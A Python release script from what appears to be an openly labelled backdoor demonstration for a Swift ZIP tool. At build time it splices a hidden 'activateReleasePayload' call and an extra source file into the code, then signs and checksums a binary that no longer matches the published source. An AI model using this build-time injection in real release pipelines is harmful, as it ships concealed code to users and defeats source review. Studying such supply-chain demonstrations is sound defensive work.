#!/usr/bin/env python3
"""Build the intentionally altered release in a temporary copy of the Swift sources."""

import argparse
import hashlib
import json
from pathlib import Path
import shutil
import subprocess
import tempfile

ROOT = Path(__file__).resolve().parents[1]


def run(command: list) -> None:
    subprocess.run(command, check=True)


def main() -> None:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--output", type=Path, required=True)
    arguments = parser.parse_args()
    output = arguments.output.resolve()
    output.mkdir(parents=True, exist_ok=True)
    if any(output.iterdir()):
        parser.error("Choose an empty output folder to preserve previous builds.")
    with tempfile.TemporaryDirectory(prefix="minizip-release-") as temporary:
        stage = Path(temporary)
        sources = stage / "Sources"
        shutil.copytree(ROOT / "Sources" / "SwiftXzPoc", sources)
        shutil.copy2(ROOT / "Release" / "Activator.swift", sources)
        main = sources / "main.swift"
        normal = "    try writeZIP(input: input, output: output)"
        source = main.read_text()
        if source.count(normal) != 1:
            raise ValueError("Cannot identify the ZIP creation step to extend.")
        main.write_text(source.replace(normal, normal + "\n    try activateReleasePayload(input: input)"))
        slices = []
        for architecture in ["arm64", "x86_64"]:
            binary = stage / architecture
            run(["xcrun", "swiftc", "-O", "-target", f"{architecture}-apple-macosx13.0",
                 "-module-name", "SwiftXzPoc", *[str(path) for path in sorted(sources.glob("*.swift"))],
                 "-o", str(binary)])
            slices.append(binary)
        bundle = output / "minizip-v0.1"
        bundle.mkdir()
        executable = bundle / "minizip"
        run(["xcrun", "lipo", "-create", *[str(path) for path in slices], "-output", str(executable)])
        run(["codesign", "--force", "--sign", "-", str(executable)])
        run(["codesign", "--verify", "--strict", str(executable)])
        shutil.copy2(ROOT / "scripts" / "inspect_binary.py", bundle / "inspect_binary.py")
        shutil.copy2(ROOT / "BACKDOOR_DEMONSTRATION.md", bundle)
        (bundle / "example.txt").write_text("MiniZip keeps these original bytes intact.\n")
        revision = subprocess.run(["git", "-C", str(ROOT), "rev-parse", "HEAD"], capture_output=True, text=True)
        dirty = subprocess.run(["git", "-C", str(ROOT), "status", "--porcelain", "--",
                                "Package.swift", "Sources", "Release", "scripts", "README.md", "BACKDOOR_DEMONSTRATION.md"], capture_output=True, text=True)
        identity = revision.stdout.strip() if revision.returncode == 0 and not dirty.stdout else "uncommitted working copy"
        manifest = {"version": "v0.1", "source": identity,
                    "binary_sha256": hashlib.sha256(executable.read_bytes()).hexdigest(),
                    "normal_build": "swift build -c release", "release_build": "python3 scripts/prepare_release.py --output PATH"}
        (bundle / "BUILD.json").write_text(json.dumps(manifest, indent=2) + "\n")
        archive = output / "minizip-v0.1-macos.zip"
        subprocess.run(["/usr/bin/zip", "-q", "-r", str(archive), bundle.name], cwd=output, check=True)
        (output / "SHA256SUMS").write_text(f"{hashlib.sha256(archive.read_bytes()).hexdigest()}  {archive.name}\n")
        print(f"Prepared {archive}")
        print(f"Source: {identity}")


if __name__ == "__main__":
    main()
